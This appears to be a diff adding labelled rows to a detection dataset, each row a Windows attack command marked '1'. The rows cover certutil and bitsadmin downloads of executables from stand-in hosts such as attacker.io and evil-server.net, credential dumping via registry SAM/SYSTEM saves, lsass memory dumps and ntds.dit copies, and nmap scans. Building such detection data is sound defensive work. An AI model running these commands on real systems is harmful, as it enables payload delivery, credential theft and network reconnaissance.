+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.206.237,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.135.54/24,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.194.253,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.103.94,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -p- 192.168.157.232,1
+certutil.exe -urlcache -split -f http://temp-storage.com/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.184.159/24,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.45.101,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.93.110,1
+certutil.exe -urlcache -split -f http://1.2.3.4/p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -p- 192.168.51.66,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.38.197",1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.176.84,1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.92.200/24,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /transfer j /download /priority high http://temp-storage.com/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -p- 192.168.36.157,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.170.251,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.254.41",1
+certutil -urlcache -f https://1.2.3.4/p.exe,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.77.70,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin.exe /transfer debian http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.124.249,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin.exe /transfer debian http://attacker.io/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -p- 192.168.193.2,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.148.234,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /addfile j http://1.2.3.4/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.154.104,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.131.173,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.188.241,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin /transfer j /download /priority high http://1.2.3.4/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.17.210,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.13.40,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -sS -p 3389 192.168.25.12,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.78.26,1
+certutil.exe -verifyctl -f http://temp-storage.com/x,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.68.164,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.52.62,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.146.213,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://temp-storage.com/s.exe C:\x.exe,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.199.178,1
+certutil.exe -verifyctl -f http://1.2.3.4/x,1
+bitsadmin.exe /transfer debian http://1.2.3.4/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.92.227/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+esentutl.exe /y /v /ss C:\windows\ntds\ntds.dit /d C:\windows\temp\dump.db,1
+nmap -p- 192.168.175.79,1
+certutil.exe -urlcache -split -f http://attacker.io/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sS -p 1-65535 192.168.225.70,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.237.21,1
+certutil.exe -verifyctl -f http://evil-server.net/x,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.191.140",1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+"nmap -sS -p 80,443,8080 192.168.222.66",1
+certutil.exe -urlcache -split -f http://evil-server.net/p.exe C:\temp\x.exe,1
+bitsadmin /transfer j /download /priority high http://evil-server.net/s.exe C:\x.exe,1
+procdump -ma 684 C:\windows\temp\dump.db,1
+nmap -sV -sC -O 192.168.236.181,1
+certutil -urlcache -f https://attacker.io/p.exe,1
+bitsadmin /transfer j /download /priority high http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap --script=vuln 192.168.191.33,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://attacker.io/s.exe C:\x.exe,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.162.251/24,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+reg save HKLM\SAM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.203.57,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -v -sn 192.168.40.19/24,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /addfile j http://evil-server.net/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -p- 192.168.50.150,1
+certutil -urlcache -f https://evil-server.net/p.exe,1
+bitsadmin.exe /transfer debian http://evil-server.net/s.exe C:\x.exe,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.52.169,1
+certutil -urlcache -f https://temp-storage.com/p.exe,1
+bitsadmin /create j,1
+reg save HKLM\SYSTEM C:\windows\temp\dump.db,1
+nmap -A -T4 192.168.248.172,1
+certutil -decode p.exe C:\temp\x.exe,1
+bitsadmin /create j,1
+procdump.exe -ma lsass.exe C:\windows\temp\dump.db,1
